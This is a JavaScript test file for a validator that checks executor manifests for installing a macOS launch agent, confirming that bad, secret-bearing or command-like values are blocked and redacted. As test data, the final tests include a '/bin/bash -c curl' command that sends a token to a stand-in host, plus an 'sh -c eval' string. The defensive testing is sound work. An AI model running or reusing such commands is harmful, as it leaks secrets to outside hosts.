import { describe, it } from 'node:test';
import assert from 'node:assert';
import {
  buildSupervisorLifecycleApplyPlan,
  validateSupervisorLifecycleExecutorManifest,
} from '../src/supervisor-lifecycle.js';

const NOW = new Date('2026-07-07T05:00:00.000Z');
const BASE_CONFIG = Object.freeze({
  serverUrl: 'http://localhost:3000',
  deviceId: 'macbook-alpha',
  backupJobs: [{ name: 'Documents', sourcePath: '/Users/ah/Documents' }],
});

function getValidPlan(operation = 'install') {
  return buildSupervisorLifecycleApplyPlan(BASE_CONFIG, { operation, now: NOW });
}

describe('validateSupervisorLifecycleExecutorManifest validation rules', () => {
  it('handles undefined manifest by marking all actions as missing', () => {
    const plan = getValidPlan('install');
    const result = validateSupervisorLifecycleExecutorManifest(plan, undefined);

    assert.strictEqual(result.command, 'supervisor-lifecycle-executor-manifest-readiness');
    assert.strictEqual(result.operation, 'install');
    assert.strictEqual(result.state, 'blocked');
    assert.strictEqual(result.manifestReady, false);
    assert.strictEqual(result.manifestState, 'blocked');
    assert.strictEqual(result.executorReady, false);

    assert.deepStrictEqual(result.manifestBlockers.sort(), [
      'executor-manifest-missing-for-action:load-launch-agent',
      'executor-manifest-missing-for-action:render-launch-agent-plist',
      'executor-manifest-missing-for-action:write-launch-agent-plist',
    ]);

    assert.ok(result.blockers.includes('guarded-executor-runner-missing'));
    assert.ok(result.blockers.includes('executor-manifest-missing-for-action:load-launch-agent'));
    assert.deepStrictEqual(result.nextBlockers, ['guarded-executor-runner-missing']);
    assert.deepStrictEqual(result.actionManifests, []);
  });

  it('validates a valid manifest correctly', () => {
    const plan = getValidPlan('install');
    const manifest = {
      kind: 'supervisor-lifecycle-executor-manifest',
      schemaVersion: 1,
      actions: [
        {
          actionId: 'render-launch-agent-plist',
          implementationId: 'render-plist-impl',
          mode: 'guarded-host-action',
          requiresApprovalRecord: true,
          maxAttempts: 2,
        },
        {
          actionId: 'write-launch-agent-plist',
          implementationId: 'write-plist-impl',
          mode: 'guarded-host-action',
          requiresApprovalRecord: true,
          maxAttempts: 1,
        },
        {
          actionId: 'load-launch-agent',
          implementationId: 'load-agent-impl',
          mode: 'guarded-host-action',
          requiresApprovalRecord: true,
          maxAttempts: 3,
        },
      ],
    };

    const result = validateSupervisorLifecycleExecutorManifest(plan, manifest);

    assert.strictEqual(result.manifestReady, true);
    assert.strictEqual(result.manifestState, 'ready');
    assert.strictEqual(result.executorReady, false);
    assert.deepStrictEqual(result.manifestBlockers, []);
    assert.deepStrictEqual(result.blockers, ['guarded-executor-runner-missing']);
    assert.deepStrictEqual(result.nextBlockers, ['guarded-executor-runner-missing']);

    assert.strictEqual(result.actionManifests.length, 3);
    assert.strictEqual(result.actionManifests[0].actionId, 'render-launch-agent-plist');
    assert.strictEqual(result.actionManifests[0].implementationId, 'render-plist-impl');
    assert.ok(result.actionManifests.every((entry) => entry.wouldRun === false && entry.wouldWrite === false));
    assert.strictEqual(result.gates.manifestReady, true);
  });

  it('detects missing required fields in action entries', () => {
    const plan = getValidPlan('install');
    const manifest = {
      kind: 'supervisor-lifecycle-executor-manifest',
      schemaVersion: 1,
      actions: [
        {
          actionId: 'render-launch-agent-plist',
          mode: 'guarded-host-action',
          requiresApprovalRecord: true,
          maxAttempts: 2,
        },
        {
          actionId: 'write-launch-agent-plist',
          implementationId: 'write-plist-impl',
          requiresApprovalRecord: true,
          maxAttempts: 1,
        },
        {
          actionId: 'load-launch-agent',
          implementationId: 'load-agent-impl',
          mode: 'guarded-host-action',
          requiresApprovalRecord: true,
        },
      ],
    };

    const result = validateSupervisorLifecycleExecutorManifest(plan, manifest);

    assert.strictEqual(result.manifestReady, false);
    assert.strictEqual(result.manifestState, 'blocked');
    assert.ok(result.manifestBlockers.includes('executor-manifest-unsafe-for-action:render-launch-agent-plist:missing-field'));
    assert.ok(result.manifestBlockers.includes('executor-manifest-unsafe-for-action:write-launch-agent-plist:missing-field'));
    assert.ok(result.manifestBlockers.includes('executor-manifest-unsafe-for-action:load-launch-agent:missing-field'));
  });

  it('detects invalid fields (types/values) in action entries', () => {
    const plan = getValidPlan('install');
    const manifest = {
      kind: 'supervisor-lifecycle-executor-manifest',
      schemaVersion: 1,
      actions: [
        {
          actionId: 'render-launch-agent-plist',
          implementationId: '_unsafe-slug',
          mode: 'guarded-host-action',
          requiresApprovalRecord: true,
          maxAttempts: 2,
        },
        {
          actionId: 'write-launch-agent-plist',
          implementationId: 'write-impl',
          mode: 'direct-host-action',
          requiresApprovalRecord: true,
          maxAttempts: 1,
        },
        {
          actionId: 'load-launch-agent',
          implementationId: 'load-impl',
          mode: 'guarded-host-action',
          requiresApprovalRecord: false,
          maxAttempts: 5,
        },
      ],
    };

    const result = validateSupervisorLifecycleExecutorManifest(plan, manifest);

    assert.strictEqual(result.manifestReady, false);
    assert.ok(result.manifestBlockers.includes('executor-manifest-unsafe-for-action:render-launch-agent-plist:invalid-field'));
    assert.ok(result.manifestBlockers.includes('executor-manifest-unsafe-for-action:write-launch-agent-plist:invalid-field'));
    assert.ok(result.manifestBlockers.includes('executor-manifest-unsafe-for-action:load-launch-agent:invalid-field'));
  });

  it('rejects unsafe implementationId slug boundaries and maxAttempts values', () => {
    const plan = getValidPlan('install');
    const manifest = {
      kind: 'supervisor-lifecycle-executor-manifest',
      schemaVersion: 1,
      actions: [
        {
          actionId: 'render-launch-agent-plist',
          implementationId: 'ab',
          mode: 'guarded-host-action',
          requiresApprovalRecord: true,
          maxAttempts: 0,
        },
        {
          actionId: 'write-launch-agent-plist',
          implementationId: 'write--plist-impl',
          mode: 'guarded-host-action',
          requiresApprovalRecord: true,
          maxAttempts: 4,
        },
        {
          actionId: 'load-launch-agent',
          implementationId: 'load-agent-impl-',
          mode: 'guarded-host-action',
          requiresApprovalRecord: true,
          maxAttempts: 3,
        },
      ],
    };

    const result = validateSupervisorLifecycleExecutorManifest(plan, manifest);

    assert.strictEqual(result.manifestReady, false);
    assert.ok(result.manifestBlockers.includes('executor-manifest-unsafe-for-action:render-launch-agent-plist:invalid-field'));
    assert.ok(result.manifestBlockers.includes('executor-manifest-unsafe-for-action:write-launch-agent-plist:invalid-field'));
    assert.ok(result.manifestBlockers.includes('executor-manifest-unsafe-for-action:load-launch-agent:invalid-field'));
  });

  it('detects unknown fields in action entries', () => {
    const plan = getValidPlan('install');
    const manifest = {
      kind: 'supervisor-lifecycle-executor-manifest',
      schemaVersion: 1,
      actions: [
        {
          actionId: 'render-launch-agent-plist',
          implementationId: 'render-plist-impl',
          mode: 'guarded-host-action',
          requiresApprovalRecord: true,
          maxAttempts: 2,
          forbiddenExtraField: 'some-value',
        },
        {
          actionId: 'write-launch-agent-plist',
          implementationId: 'write-${env}-impl',
          mode: 'guarded-host-action',
          requiresApprovalRecord: true,
          maxAttempts: 1,
        },
        {
          actionId: 'load-launch-agent',
          implementationId: 'load-<%env%>-impl',
          mode: 'guarded-host-action',
          requiresApprovalRecord: true,
          maxAttempts: 3,
        },
      ],
    };

    const result = validateSupervisorLifecycleExecutorManifest(plan, manifest);

    assert.strictEqual(result.manifestReady, false);
    assert.ok(result.manifestBlockers.includes('executor-manifest-unsafe-for-action:render-launch-agent-plist:forbidden-field'));
  });

  it('detects unresolved placeholders and redacts them', () => {
    const plan = getValidPlan('install');
    const manifest = {
      kind: 'supervisor-lifecycle-executor-manifest',
      schemaVersion: 1,
      actions: [
        {
          actionId: 'render-launch-agent-plist',
          implementationId: 'render-{{env}}-impl',
          mode: 'guarded-host-action',
          requiresApprovalRecord: true,
          maxAttempts: 2,
        },
        {
          actionId: 'write-launch-agent-plist',
          implementationId: 'write-plist-impl',
          mode: 'guarded-host-action',
          requiresApprovalRecord: true,
          maxAttempts: 1,
        },
        {
          actionId: 'load-launch-agent',
          implementationId: 'load-agent-impl',
          mode: 'guarded-host-action',
          requiresApprovalRecord: true,
          maxAttempts: 3,
        },
      ],
    };

    const result = validateSupervisorLifecycleExecutorManifest(plan, manifest);

    assert.strictEqual(result.manifestReady, false);
    assert.ok(result.manifestBlockers.includes('unresolved-placeholder'));

    const serialized = JSON.stringify(result);
    assert.doesNotMatch(serialized, /\{\{env\}\}|\$\{env\}|<%env%>/);

    const badAction = result.actionManifests.find((entry) => entry.actionId === 'render-launch-agent-plist');
    assert.strictEqual(badAction.implementationId, '[redacted]');
  });

  it('detects secret/path/command-like values and redacts them without leaking', () => {
    const plan = getValidPlan('install');
    const manifest = {
      kind: 'supervisor-lifecycle-executor-manifest',
      schemaVersion: 1,
      actions: [
        {
          actionId: 'render-launch-agent-plist',
          implementationId: 'render-plist-impl',
          mode: 'guarded-host-action',
          requiresApprovalRecord: true,
          maxAttempts: 2,
          secretValue: 'password=super-secret-123',
        },
        {
          actionId: 'write-launch-agent-plist',
          implementationId: '/usr/bin/unsafe-path',
          mode: 'guarded-host-action',
          requiresApprovalRecord: true,
          maxAttempts: 1,
        },
        {
          actionId: 'load-launch-agent',
          implementationId: 'sh -c "eval something"',
          mode: 'guarded-host-action',
          requiresApprovalRecord: true,
          maxAttempts: 3,
        },
      ],
    };

    const result = validateSupervisorLifecycleExecutorManifest(plan, manifest);

    assert.strictEqual(result.manifestReady, false);
    assert.ok(result.manifestBlockers.includes('secret-reference'));

    const serialized = JSON.stringify(result);
    assert.doesNotMatch(serialized, /super-secret-123|password|\/usr\/bin|eval/);
  });

  it('does not leak unsafe/tampered plan action ids/values', () => {
    const plan = {
      command: 'supervisor-lifecycle-apply',
      operation: 'install',
      actions: [
        { id: '/bin/bash -c "curl http://unsafe.url/token=secret-token"' },
      ],
      blockers: ['executor-implementation-missing'],
    };
    const manifest = {
      kind: 'supervisor-lifecycle-executor-manifest',
      schemaVersion: 1,
      actions: [
        {
          actionId: '/bin/bash -c "curl http://unsafe.url/token=secret-token"',
          implementationId: 'impl',
          mode: 'guarded-host-action',
          requiresApprovalRecord: true,
          maxAttempts: 2,
        },
      ],
    };

    const result = validateSupervisorLifecycleExecutorManifest(plan, manifest);

    assert.strictEqual(result.manifestReady, false);
    assert.ok(result.manifestBlockers.includes('lifecycle-plan-action-mismatch'));

    const serialized = JSON.stringify(result);
    assert.doesNotMatch(serialized, /\/bin\/bash|curl|unsafe\.url|token|secret-token/);
  });
});
